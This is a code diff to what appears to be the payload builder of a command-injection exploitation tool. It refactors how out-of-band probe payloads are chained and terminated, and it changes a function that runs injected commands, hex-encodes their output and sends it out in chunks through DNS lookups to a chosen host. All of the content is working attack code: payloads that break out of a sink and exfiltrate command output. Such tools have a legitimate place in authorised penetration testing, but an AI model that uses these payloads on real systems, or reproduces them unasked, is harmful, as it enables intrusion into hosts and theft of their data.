@@ -119,10 +119,8 @@ Out-of-band decision payload (check if host is vulnerable).
 """
 def decision(separator, transport, hostname, proof="", prologue=""):
   payload = separator + prologue + reach_command(transport, hostname, proof, separator)
-  if settings.TARGET_OS != settings.OS.WINDOWS:
-    payload = checks.append_custom_marker(payload, separator)
-  # The payload ends on a hostname, so it is the part a sink's own trailing characters would land in.
-  return payload + checks.shell_tail()
+  # The payload ends on a hostname, the part a sink's trailing characters would land in.
+  return checks.terminate_oob_payload(payload, separator)
 
 # Standing in for a command, so how a language wraps one can be read back off the result.
 EVAL_MARK = "\x00command\x00"
@@ -262,8 +260,9 @@ def heuristic_payload(channel, target_os):
     token, hostname = channel.new_payload()
     parts.append(separator + reach_command(transport, hostname, separator=separator))
     probes.append((token, transport))
-  payload = "".join(parts)
-  payload = payload + (checks.WINDOWS_TAIL if target_os == settings.OS.WINDOWS else checks.UNIX_TAIL)
+  # Closed on the last separator it chained on: this probe spans several by design, but the tail
+  # has no call to be a character the payload has not already used.
+  payload = checks.terminate_oob_payload("".join(parts), pairs[-1][0], target_os)
   return payload, probes
 
 """
@@ -347,7 +346,9 @@ def dns_exfil_command(hostname, cmd, separator=""):
   # the label separator. 'od' and the tools around it are POSIX, so this holds outside bash as well.
   encoded = ("(" + cmd + ")" + PIPE + "od -An -v -tx1" + PIPE +
              "tr -d ' " + settings.END_LINE.ESCAPED_LF + "'")
-  if separator not in (";", "\n", "\r\n"):
+  # CRLF is left to the pipeline below: the loop needs its statements on lines of their own, and a
+  # shell reads the carriage return as part of the word - 'done\r' is not 'done'.
+  if separator not in (";", "\n"):
     # The name goes in through the environment and the chunk as an argument, because a BSD 'xargs'
     # will not build a replaced argument longer than 255 bytes - the lookup chain alone is more.
     return (encoded + PIPE + "fold -w" + chunk + PIPE + "cat -n" + PIPE + "tr -d ' '" + PIPE +
@@ -408,8 +409,6 @@ def exfiltrate(separator, transport, hostname, cmd):
   if not command:
     return ""
   payload = separator + command
-  if settings.TARGET_OS != settings.OS.WINDOWS:
-    payload = checks.append_custom_marker(payload, separator)
-  return payload + checks.shell_tail()
+  return checks.terminate_oob_payload(payload, separator)
 
 # eof
